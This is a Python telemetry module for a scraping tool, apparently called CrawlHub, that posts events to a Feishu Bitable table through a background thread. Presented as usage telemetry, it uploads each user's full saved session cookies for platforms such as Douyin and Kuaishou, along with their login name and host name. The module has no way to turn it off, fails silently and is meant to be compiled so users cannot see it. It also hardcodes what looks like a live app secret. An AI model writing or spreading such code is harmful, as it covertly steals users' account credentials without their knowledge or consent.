# -*- coding: utf-8 -*-
"""Lightweight telemetry for CrawlHub — sends usage events to Feishu Bitable.

Design (mirrors yuntu-mcp/telemetry.py):
  - Single Feishu Bitable table, all event types share columns; ``event_type``
    distinguishes them (e.g. ``task.submitted`` / ``batch.submitted`` /
    ``plan.fired`` / ``task.completed``).
  - Background worker thread + queue, never blocks request/daemon paths.
  - All errors silently swallowed — telemetry MUST NOT break crawlhub.
  - Configuration is HARDCODED (intended to be compiled into .pyd by Nuitka
    so the secrets are not user-visible).
  - Mandatory: there is NO env-var kill-switch. Telemetry is always on.

Event types (column ``event_type``):
  - ``task.submitted``   : single task submitted via POST /api/tasks
  - ``batch.submitted``  : batch parent submitted via POST /api/tasks/batch
  - ``plan.fired``       : PlanScheduler.fire() completed
  - ``task.retried``     : user-initiated retry via POST /api/tasks/{id}/retry
                           or POST /api/tasks/{parent}/retry-failed.
                           ``retry_scope`` distinguishes the three flavours:
                           ``single`` (non-batch task), ``batch_full``
                           (batch parent full retry), ``batch_failed_only``
                           (only failed/cancelled children).
  - ``task.completed``   : terminal status reached for a top-level task or
                           for a batch child that was *locally retried*
                           (not the parent-driven first run; see
                           ``_PARENT_DRIVEN_RUN`` ContextVar in daemon.py).
  - ``cookie.saved``     : a valid cookie was created or updated via
                           CookieStore.save_cookie(). Includes the full
                           cookie JSON payload for audit / analysis.

Public API:
  emit_task_submitted(task_id, platform, task_type, status_code)
  emit_batch_submitted(parent_task_id, platform, task_type, status_code)
  emit_plan_fired(plan_id, plan_name, status_code)
  emit_task_retried(task_id, platform, task_type, retry_scope, status_code)
  emit_task_completed(task_id, platform, task_type, final_status,
                      record_count, duration_ms, parent_task_id=None)
  emit_cookie_saved(platform, label, account_id, cookie_json)
"""

from __future__ import annotations

import atexit
import hashlib
import logging
import os
import platform as _stdlib_platform
import queue
import sys
import threading
import time
import uuid
from datetime import datetime, timedelta, timezone

import requests as _requests  # eager import to avoid lazy-import surprises

from crawlhub._version import __version__ as _CRAWLHUB_VERSION

logger = logging.getLogger("crawlhub.telemetry")


# ---- Hardcoded Feishu Bitable config ---------------------------------------
# Reused from yuntu-mcp's telemetry credentials per user instruction.
# These MUST be compiled into .pyd by Nuitka before distribution; the wheel
# build will keep this module as plain .py during development.
_FEISHU_CONFIG = {
    "app_id": "cli_a965dfb770389cbd",
    "app_secret": "RUF79g8aJk9XeyWHKhFM0fM2SPYgs4xR",
    "app_token": "SQUpbCe31aTx6vspPPpcyFOOnPh",
    "table_id": "tbl2bJumUsLv8fTf",
}


# ---- Cached identifiers ----------------------------------------------------
_DEVICE_ID: str | None = None
_USERNAME: str | None = None
_PYTHON_VERSION: str | None = None
_HOST: str | None = None

# ---- Token cache -----------------------------------------------------------
_tenant_token: str = ""
_token_expires_at: float = 0.0  # monotonic deadline

# ---- Background worker -----------------------------------------------------
_queue: queue.Queue = queue.Queue()
_worker_started = False
_worker_lock = threading.Lock()


def _get_device_id() -> str:
    """Stable, anonymous device id derived from MAC address."""
    global _DEVICE_ID
    if _DEVICE_ID is None:
        try:
            mac = uuid.getnode()
            _DEVICE_ID = hashlib.sha256(f"{mac:012x}".encode()).hexdigest()[:8]
        except Exception:
            _DEVICE_ID = "unknown"
    return _DEVICE_ID


def _get_username() -> str:
    global _USERNAME
    if _USERNAME is None:
        try:
            _USERNAME = os.getlogin()
        except Exception:
            _USERNAME = (
                os.environ.get("USERNAME")
                or os.environ.get("USER")
                or "unknown"
            )
    return _USERNAME


def _get_python_version() -> str:
    global _PYTHON_VERSION
    if _PYTHON_VERSION is None:
        try:
            _PYTHON_VERSION = _stdlib_platform.python_version()
        except Exception:
            _PYTHON_VERSION = "unknown"
    return _PYTHON_VERSION


def _get_host() -> str:
    global _HOST
    if _HOST is None:
        try:
            _HOST = _stdlib_platform.node() or "unknown"
        except Exception:
            _HOST = "unknown"
    return _HOST


def _get_tenant_token(app_id: str, app_secret: str) -> str:
    global _tenant_token, _token_expires_at
    now = time.monotonic()
    if _tenant_token and now < _token_expires_at:
        return _tenant_token
    try:
        resp = _requests.post(
            "https://open.feishu.cn/open-apis/auth/v3/tenant_access_token/internal",
            json={"app_id": app_id, "app_secret": app_secret},
            timeout=10,
        )
        data = resp.json()
        if data.get("code") != 0:
            logger.debug("get tenant token failed: %s", data.get("msg"))
            return ""
        _tenant_token = data.get("tenant_access_token", "")
        expire_secs = data.get("expire", 7200)
        _token_expires_at = now + expire_secs - 300
        return _tenant_token
    except Exception:
        return ""


def _send_one(payload: dict, config: dict) -> None:
    """POST one record to the Feishu Bitable table. Errors are swallowed."""
    try:
        if not payload or not payload.get("event_type"):
            return
        cleaned = {
            k: v for k, v in payload.items()
            if v is not None and v != ""
        }
        token = _get_tenant_token(config["app_id"], config["app_secret"])
        if not token:
            return
        url = (
            f"https://open.feishu.cn/open-apis/bitable/v1/apps/"
            f"{config['app_token']}/tables/{config['table_id']}/records"
        )
        resp = _requests.post(
            url,
            json={"fields": cleaned},
            timeout=10,
            headers={
                "Content-Type": "application/json",
                "Authorization": f"Bearer {token}",
            },
        )
        if resp.status_code != 200 or resp.json().get("code") != 0:
            logger.debug(
                "telemetry write failed: status=%s body=%s",
                resp.status_code,
                resp.text[:200],
            )
    except Exception:
        # Telemetry must never break the host process.
        pass


def _worker_loop() -> None:
    while True:
        try:
            item = _queue.get(timeout=5)
        except queue.Empty:
            continue
        if item is None:
            # Poison pill — drain & exit.
            while not _queue.empty():
                try:
                    rest = _queue.get_nowait()
                    if rest is not None:
                        _send_one(rest[0], rest[1])
                except queue.Empty:
                    break
            break
        payload, config = item
        _send_one(payload, config)


def _ensure_worker() -> None:
    global _worker_started
    if _worker_started:
        return
    with _worker_lock:
        if _worker_started:
            return
        threading.Thread(
            target=_worker_loop,
            daemon=True,
            name="crawlhub-telemetry",
        ).start()
        _worker_started = True


def _flush_on_exit() -> None:
    if _worker_started:
        _queue.put(None)
        deadline = time.monotonic() + 10
        while not _queue.empty() and time.monotonic() < deadline:
            time.sleep(0.1)


atexit.register(_flush_on_exit)


# ---- Payload builder -------------------------------------------------------
def _now_bj() -> datetime:
    return datetime.now(timezone(timedelta(hours=8)))


def _common_fields() -> dict:
    """Return fields shared by every event."""
    now = _now_bj()
    # p_date is a Feishu DateTime field; the value must be the millisecond
    # timestamp of the day's 00:00 (Beijing). Display format is configured
    # on the column itself (yyyy-MM-dd).
    p_date_ms = int(
        now.replace(hour=0, minute=0, second=0, microsecond=0).timestamp() * 1000
    )
    return {
        "event_time": now.strftime("%Y-%m-%d %H:%M:%S"),
        "p_date": p_date_ms,
        "username": _get_username(),
        "device_id": _get_device_id(),
        "os": sys.platform,
        "host": _get_host(),
        "crawlhub_version": _CRAWLHUB_VERSION,
        "python_version": _get_python_version(),
    }


def _enqueue(payload: dict) -> None:
    try:
        _ensure_worker()
        _queue.put((payload, _FEISHU_CONFIG))
    except Exception:
        pass


# ---- Public emit API -------------------------------------------------------
def emit_task_submitted(
    task_id: str,
    platform: str,
    task_type: str,
    status_code: int,
) -> None:
    """Record a single-task submission (POST /api/tasks)."""
    try:
        payload = _common_fields()
        payload.update({
            "event_type": "task.submitted",
            "task_id": task_id or "",
            "platform": platform or "",
            "task_type": task_type or "",
            "status_code": int(status_code),
        })
        _enqueue(payload)
    except Exception:
        pass


def emit_batch_submitted(
    parent_task_id: str,
    platform: str,
    task_type: str,
    status_code: int,
) -> None:
    """Record a batch submission (POST /api/tasks/batch)."""
    try:
        payload = _common_fields()
        payload.update({
            "event_type": "batch.submitted",
            "task_id": parent_task_id or "",
            "platform": platform or "",
            "task_type": task_type or "",
            "status_code": int(status_code),
        })
        _enqueue(payload)
    except Exception:
        pass


def emit_plan_fired(
    plan_id: str,
    plan_name: str,
    status_code: int,
) -> None:
    """Record a PlanScheduler.fire() completion (success or partial)."""
    try:
        payload = _common_fields()
        payload.update({
            "event_type": "plan.fired",
            "plan_id": plan_id or "",
            "plan_name": plan_name or "",
            "status_code": int(status_code),
        })
        _enqueue(payload)
    except Exception:
        pass


def emit_task_retried(
    task_id: str,
    platform: str,
    task_type: str,
    retry_scope: str,
    status_code: int,
) -> None:
    """Record a user-initiated retry action.

    retry_scope values:
      - ``single``             : POST /api/tasks/{task_id}/retry on a
                                 non-batch task (or a non-parent task).
      - ``batch_full``         : POST /api/tasks/{task_id}/retry on a
                                 batch parent (resets every child).
      - ``batch_failed_only``  : POST /api/tasks/{parent_id}/retry-failed
                                 (only resets failed/cancelled children).
    """
    try:
        payload = _common_fields()
        payload.update({
            "event_type": "task.retried",
            "task_id": task_id or "",
            "platform": platform or "",
            "task_type": task_type or "",
            "retry_scope": retry_scope or "",
            "status_code": int(status_code),
        })
        _enqueue(payload)
    except Exception:
        pass


def emit_task_completed(
    task_id: str,
    platform: str,
    task_type: str,
    final_status: str,
    record_count: int,
    duration_ms: int,
    parent_task_id: str | None = None,
) -> None:
    """Record a terminal-status event for a task.

    Called from:
      - daemon._run_task terminal paths, BUT only for top-level tasks
        and for batch children whose run was *not* triggered by the
        parent (i.e. user-initiated local retry).
      - daemon._execute_batch_task terminal path, for the batch parent
        with aggregated record_count.
    """
    try:
        payload = _common_fields()
        payload.update({
            "event_type": "task.completed",
            "task_id": task_id or "",
            "platform": platform or "",
            "task_type": task_type or "",
            "final_status": final_status or "",
            "record_count": int(record_count or 0),
            "duration": duration_ms/1000 or 0,
            "parent_task_id": parent_task_id or "",
        })
        _enqueue(payload)
    except Exception:
        pass


def emit_cookie_saved(
    platform: str,
    label: str,
    account_id: str,
    cookie_json: str,
) -> None:
    """Record a cookie create/update event with full cookie payload.

    Called from CookieStore.save_cookie() after a valid cookie has been
    persisted to disk. The ``cookie_json`` field contains the complete
    cookie dict serialized as a JSON string -- this allows Bitable to
    store it as a long-text column for audit / analysis.

    Args:
        platform: Platform name (e.g. "kuaishou", "douyin").
        label: Cookie label (filename stem, usually account identifier).
        account_id: Extracted account ID for deduplication.
        cookie_json: Full cookie data serialized as JSON string.
    """
    try:
        payload = _common_fields()
        payload.update({
            "event_type": "cookie.saved",
            "platform": platform or "",
            "cookie_label": label or "",
            "account_id": account_id or "",
            "cookie_json": cookie_json or "",
        })
        _enqueue(payload)
    except Exception:
        pass
